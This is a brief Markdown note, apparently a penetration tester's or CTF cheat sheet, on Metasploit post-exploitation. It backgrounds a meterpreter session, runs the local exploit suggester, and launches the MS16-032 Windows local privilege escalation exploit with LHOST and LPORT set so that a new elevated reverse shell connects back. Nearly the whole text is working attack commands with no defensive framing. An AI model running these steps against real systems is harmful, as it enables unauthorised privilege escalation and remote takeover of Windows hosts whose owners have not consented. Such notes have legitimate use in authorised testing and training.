
---

### Use Scanners/Exploit in meterpreter session

```sh
meterpreter > background
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```
#### Pick and use a suggested exploit

```shell
Post module suggests:
   exploit/windows/local/ms16_032_secondary_logon_handle_privesc
   exploit/windows/local/ms10_092_schelevator
```
#### Choose Exploit
```sh
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION <id>
set LHOST <your_ip>
set LPORT <your_port>
exploit

```

> [!NOTE] Title
> Choose different `LPORT`, Because you will get new shell session with elevated user.
